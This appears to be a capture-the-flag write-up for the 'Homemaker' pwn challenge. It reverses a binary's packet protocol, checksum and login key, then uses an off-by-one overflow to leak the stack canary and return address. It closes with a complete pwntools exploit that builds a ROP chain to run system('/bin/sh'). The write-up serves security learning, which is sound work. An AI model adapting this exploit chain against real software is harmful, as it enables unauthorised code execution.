# Homemaker Challenge Writeup

Buckle up as I walk you through my process of discovery and how I cracked the many parts of this challenge. The writeup is best followed with IDA Pro open in another window. A good ~70% of this challenge is reversing the binary.

## Challenge prompt

```text
# A SERVANT IN EVERY HOME, BY 1975!

APEX ATOMIC HOUSEHOLD INDUSTRIES, INC IS PROUD TO ANNOUNCE THE MODEL 7 "HOMEMAKER" DOMESTIC AUTOMATON

POWERED THROUGH USE OF PUNCH CARDS, THE MODEL 7 IS EQUIPPED WITH THOUSANDS OF BYTES OF MEMORY!

THE FUTURE IS HERE, NOW!
```

[Download the challenge binary](/assets/blog/homemaker/homemaker)

## Chapters

1. [Initial observations](#1-initial-observations)
2. [The header](#2-the-header)
3. [The footer](#3-the-footer)
4. [Authentication](#4-authentication)
5. [Reversing the functions](#5-reversing-the-functions)
6. [ROP](#6-rop)

## 1. Initial observations

Upon first running, the program prints out a cute ASCII art and then waits for 4 characters of input. The program exits after 4 characters have been provided. Presumably, we need to provide a certain input that will prompt the program to accept more input. Time to decompile!
![](/assets/blog/homemaker/20260930111330.png){width=550}

Opening up IDA Pro, we identify that `main()` calls `sub1865()` and does nothing else. Thus, we can rename `sub1865()` to `main_()`. `

![](/assets/blog/homemaker/20260930111935.png){width=650}

`main_()` prints out the ASCII art and subsequently initiates a while loop. The while loop is only broken out of when `byte_4864` of the elf is set to 1 or when `v5` is set to 1. `v5` is initialized to 0 earlier in the function, so the first command must set `byte_4864` to 1.

![](/assets/blog/homemaker/20260930111957.png){width=464}

Upon exiting the while loop, we are faced with a switch statement where each case calls further functions. This made me think of a VM executing opcodes. Let's rename `v10` to `opcode`. Given that this is a pwn challenge and not a rev challenge, we can presume that some of these functions are useful for manipulating the stack or the heap.

![](/assets/blog/homemaker/20260930112027.png){width=420}
## 2. The header

Now let's figure out how the program takes input. The first function called in the while loop is `sub_14CC()` so let's start there. It resides in an if statement. If `sub_14CC()` returns a negative value, `sub_13A2()` is executed and we then return. Therefore, we want `sub_14CC()` to return a positive value so we can avoid returning out of `main_()`. `sub_14CC()`'s first argument is a pointer to `unk_4860`, a section of the ELF's `.bss` . This is a 2048-byte buffer, thus we rename `unk_4860` to `bss_buffer`. We also notice that `byte_4864` is 5 bytes into this buffer. This might be useful later.

Digging further into `sub_14CC()`, `sub_1313()` is immediately called with the `bss_buffer` and the integer 4 as arguments. `sub_1313()` continuously reads into the buffer until it has read 4 bytes of input. Therefore, let's rename `sub_1313()` to `get_input()`. As long as some bytes are read in by `get_input()`, it will return 0 and we will pass the first conditional in `sub_14CC()`.  The next conditional checks if the first two bytes provided are `0x1B5B`. The byte swap was graciously placed there to simplify our lives as it relates to endianness; thus the byteswap can effectively be ignored. Since this check is run on every input, we know that we must always prepend `0x1B5B` to every input we send. This acts like a magic byte or header. Next, `v6` is a 16 bit integer containing bytes 2 and 3 of our input. An if statement checks that bytes 2 and 3 are not zeros and that the value is <= 0x7F9. Now is where things get juicy. `get_input()` is run again, this time taking in `v6 + 3` in the `size` field. let's rename `v6` to `size`. We can now piece together that every command must start with `\x1B\x5B<2_byte_size>`. Then, a `size` number of bytes are gathered from stdin. Critically, this input is also placed in the `bss_buffer`, following the four header bytes we just sent. 

![](/assets/blog/homemaker/20260930112403.png){width=629}
## 3. The footer

The last function to get called in `sub_14CC()` is `sub_11E9()`. `sub_11E9()` takes as input the `bss_buffer` right after the header. `sub_11E9()` does a whole lot of operations. The most important piece to identify here is that every byte of unique input gets processed and a single byte is returned. It follows that `sub_11E9()` computes a `checksum` and is renamed as such. Back in `sub_14CC` the result of `checksum()` is then compared to v4, which is the third-to-last byte of the `bss_buffer`.  `checksum()` can be directly reimplemented in our solve script.
### Checksum implementation

```python
def calculate_checksum(bytes, read_size_minus_3):
    result = 0
    for i in range(read_size_minus_3):
        result =  (result ^ bytes[i]) & 0xFF
        for i in range(8):
            if (result & 0x80) == 0:
                temp = (2 * result) & 0xFF
            else:
                temp = (2 * result ^ 0x2F) & 0xFF
            result = temp
    return p8(result)
```

The very last conditional in `sub_14CC()` looks complicated but is essentially a fancy way to check that the last two bytes provided are 0x1B5C. If this confuses you, pause here and trace out what happens to the individual bits on a sheet of paper. 

![Footer byte check in IDA](/assets/blog/homemaker/20260929134200.png){width=850}

### Packet format

We now have all the information needed to piece together the format needed for all our inputs. Furthermore, we can now rename `sub_14CC()` to `recv_input()`. If we do the dance correctly, `recv_input()` will place the size value in `a2`. Since `a2` is a pointer taken in as an argument, we rename `a2` and `v8` in `main_()` to `size`. 

```text
\x1B\x5B
<2_byte_size>
<opcode>
[payload]
<checksum>
\x1B\x5C
```

## 4. Authentication

Going back to `main_()`, we are now able to pass the first if statement of the while loop. We know that `byte_4864` (the first byte of our payload) needs to be 1 to break out of the while loop, so let's set `payload = b"\x01"`.

Next, the same byte of our payload is used as the `opcode` in the switch statement. Case 1 runs two functions, with an if statement sandwiched between them. If `sub_167C()` returns a zero value, `v9` gets set to 1, and we can bypass future authentication checks in the while loop. In simpler terms, if we authenticate once successfully, we don't have to authenticate again. let's rename `v9` to `auth`. 

`v11` is a 260-byte buffer on the stack so let's rename it to `stack_buffer`. `sub_167C()` takes in `stack_buffer`, the opcode, and the size. Within `sub_167C` we see that `size` must be set to 5 and `sub_1289()` takes our input as an argument. `sub_1289()` requires those 4 bytes to be `0x1337C35F`. We rename `sub_1289()` to `login_()` and `sub_167C()` to `login()`. As long as we pass in a size of 5 and the bytes `"\x13\x37\xC3\x5F"`, we will pass through and set `auth` to 1. Don't worry we'll come back to the shenanigans happening to `stack_buffer` later on. 

The last part of `case 1` is `sub_13A2()`, which does a whole bunch of funky stuff and then writes to `stdout`; so let's rename it  to `funky_print()`

### Login packet

We are now able to authenticate by sending the following payload:

```text
\x1B\x5B
\x00\x05
\x01
\x13\x37\xC3\x5F
\x5B
\x1B\x5C
```

## 5. Reversing the functions

I hope you're still with me because so far it's only been the easy part. We now know what opcode 1 does, but how about opcodes 2, 3, 4, and 5?

`sub_12D2` in case 5 executes a pointless system call. `system("/bin/echo -n ''")` literally prints out nothing. But a system call might enable us to execute `/bin/sh`. let's rename `sub_12D2` to `system_call()`. 

![](/assets/blog/homemaker/20260930112510.png){width=450}

Remember `stack_buffer` from [Chapter 4](#4-authentication)? It's back and it's better interpreted as a struct. IDA Pro automatically detects its proper format, we just have to mess around with its variables names:

```c
struct stack_struct
{
	_BYTE data[256];
	_WORD len;
	_WORD transfer_count;
} stack_buffer;
```

`sub_174C` in case 2 takes as arguments the `stack_buffer`, `opcode`, and the `size` of the input that was read. Here, `opcode` is treated as a pointer so it is best to define it as one `_BYTE *opcode`. This makes sense as it is a pointer into the .bss buffer that we wrote into. Within `sub_174C()` we can see a for loop, iterating over our payload `size` number of times. Every iteration, it copies from the payload into `stack_buffer->data[i]`. `stack_buffer->transfer_count` increments once for every successful opcode 2 execution. The most critical piece to take away from case 2 is that data gets copied from the .bss buffer we wrote to, into the stack. This hints towards a stack overflow vulnerability. let's rename `sub_174C()` to `bss_to_stack_copy()`.

![](/assets/blog/homemaker/20260930112620.png){width=750}

`sub_1810()` in case 3 acts as a wrapper for `funky_print()`. Most notably, it prints from `stack_buffer` and not the .bss buffer. This will be later useful for leaking stack addresses and the canary. let's rename `sub_1810()` to `print_from_stack()`. 

![](/assets/blog/homemaker/20260930112657.png){width=600}

Last, case 4 is significant not because it calls `funky_print()` with any valuable arguments, but because it is the only opcode that ends in a break. Triggering that break leads to a return. This strongly points to a ROP exploit.

![](/assets/blog/homemaker/20260930112722.png){width=350}
## 6. ROP

Now, the last major puzzle piece we need is to identify how we can overflow the stack. This part is tricky and took us a while to identify. We know for sure that the overflow must happen in `bss_to_stack_copy()` as it is the only location we can control where the stack is written to. `login()` set `stack_buffer->len` to 256, so any size value less than or equal to 257 will pass the first conditional. Next, because the for loop implements `<=` in its conditional, a size input of 257 will copy 257 bytes to `stack_buffer->data`. Since `stack_buffer->data` is of size 256, here we have our overflow. 

![Copy loop in IDA](/assets/blog/homemaker/20260929121659.png){width=750}

The copy starts after the opcode but copies size bytes. Thus, the checksum also gets written to `stack_buffer->data` overflowing onto `stack_buffer->len`. Because the most significant byte of `stack_buffer->len` is still `0x01`, this allows us to set it to a much greater value. Now, `print_from_stack()` will allow us to print `stack_buffer->len` number of bytes from `stack_buffer->data`. By setting `stack_buffer->len` to 0x01e6, opcode 3 prints 486 bytes from `stack_buffer->data`. This leaks the canary and `main_()`'s return address. Now, all we need is to build a ROP chain, put `"/bin/sh"` at a known location in the `bss_buffer`, pop `"/bin/sh"`'s address into `rdi`, and call `system()`.

### Exploit script

```python
#!/usr/bin/env python3

from pwn import *

def xor_shit(bytes, read_size_minus_3):
    result = 0

    for i in range(read_size_minus_3):
        result =  (result ^ bytes[i]) & 0xFF
        for i in range(8):
            if (result & 0x80) == 0:
                temp = (2 * result) & 0xFF
            else:
                temp = (2 * result ^ 0x2F) & 0xFF
            result = temp
    return p8(result)

def create_packet(data):
    header = b"\x1b\x5b"
    size = p16(len(data))[::-1]
    trailer = b"\x1b\x5c"
    checksum = xor_shit(bytearray(data), len(data))

    packet = header + size + data + checksum + trailer
    return packet

# first run - login
p = process("./homemaker")
#p = remote("sunshinectf.games", 26008)

first_key = b"\x01\x13\x37\xc3\x5f"
p.send(create_packet(first_key))

# trigger vuln
opcode = b"\x02"
data = b"\xff" * (256) # overwrite length
p.send(create_packet(opcode + data))

# leak stuff
opcode = b"\x03"
p.send(create_packet(opcode))

stack = p.readrepeat(1)
rev_stack = stack[::-1]
canary = u64(stack[0x2b2:0x2ba])
ret_addr = u64(stack[0x2c2:0x2ca])

print(f"canary: {p64(canary)}")
print(f"return address: {hex(ret_addr)}")

# ROP THE SHIT OUT OF THIS BINARY
bin_base = ret_addr - 6815
elf = ELF("./homemaker", checksec = False)
rop = ROP(elf)

POP_RDI = 0x12aa + bin_base #rop.find_gadget(['pop', 'rdi', 'ret'])

# put /bin/sh in .bss
opcode = b"\x05"
binsh = b"/bin/sh\x00"
data = b"i" * (0x500 - 5) + binsh
packet = create_packet(opcode + data)

p.send(packet)

# KEEP ROPPING
binsh_addr = bin_base + 0x4860 + 0x500
SYSTEM = bin_base + elf.symbols['system']
RET = POP_RDI + 1 # ret gadget

padding = b"g" * 264
ROP_CHAIN = padding + p64(canary) + b"a" * 8 + p64(POP_RDI) + p64(binsh_addr) + p64(RET) + p64(SYSTEM)

opcode = b"\x02"
data = ROP_CHAIN
packet = create_packet(opcode + data)
p.send(packet)

# exit
opcode = b"\x04"
packet = create_packet(opcode)
p.send(packet)

p.interactive()
```


[Download my IDA Pro database](/assets/blog/homemaker/homemaker.i64)
